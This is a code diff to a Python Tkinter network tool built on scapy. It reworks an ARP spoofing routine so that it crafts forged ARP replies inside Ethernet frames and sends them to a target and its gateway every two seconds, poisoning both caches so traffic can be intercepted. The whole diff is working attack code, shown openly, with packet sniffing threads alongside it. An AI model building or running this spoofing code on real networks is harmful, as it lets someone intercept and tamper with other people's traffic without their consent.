@@ -1,7 +1,7 @@
 import os
 import socket
 import psutil
-from scapy.all import ARP, Ether, srp, send, conf, sniff, Raw, IP
+from scapy.all import ARP, Ether, srp, send, conf, sniff, Raw, IP, sendp
 import tkinter as tk
 from tkinter import ttk, scrolledtext
 import threading
@@ -211,6 +211,7 @@ class NetworkScanGUI:
             self.spoofing = True
             self.spoof_thread_stop_event.clear()
             self.sniff_thread_stop_event.clear()
+
             self.log_message(f"Starting ARP spoofing: Target IP={target_ip}, Gateway IP={gateway_ip}")
             self.spoof_thread = threading.Thread(target=self.arp_spoof, args=(target_ip, gateway_ip))
             self.spoof_thread.start()
@@ -248,16 +249,33 @@ class NetworkScanGUI:
 
     @handle_exceptions
     def arp_spoof(self, target_ip, gateway_ip):
+        # Get interface name
+        interface = self.interfaces.get()
+
+        # Get MAC addresses
         target_mac = self.get_mac(target_ip)
         gateway_mac = self.get_mac(gateway_ip)
+
+        # Craft ARP replys
+        arp_reply1 = ARP(op=2, pdst=target_ip, psrc=gateway_ip)
+        arp_reply2 = ARP(op=2, pdst=gateway_ip, psrc=target_ip)
+        
+        # Craft Ethernet frames
+        ether_frame1 = Ether(dst=target_mac)
+        ether_frame2 = Ether(dst=gateway_mac)
+
+        # Combine Ethernet frames and ARP replys to make packets for each tảrget
+        packet1 = ether_frame1 / arp_reply1
+        packet2 = ether_frame2 / arp_reply2
+
         if not target_mac or not gateway_mac:
             self.log_message("Could not find MAC addresses for the provided IPs.")
             return
 
         try:
             while not self.spoof_thread_stop_event.is_set():
-                send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
-                send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
+                sendp(packet1, iface=interface, verbose=False)
+                sendp(packet2, iface=interface, verbose=False)
                 self.spoof_thread_stop_event.wait(2)
         except Exception as e:
             self.log_message(f"Error in ARP spoofing: {e}")
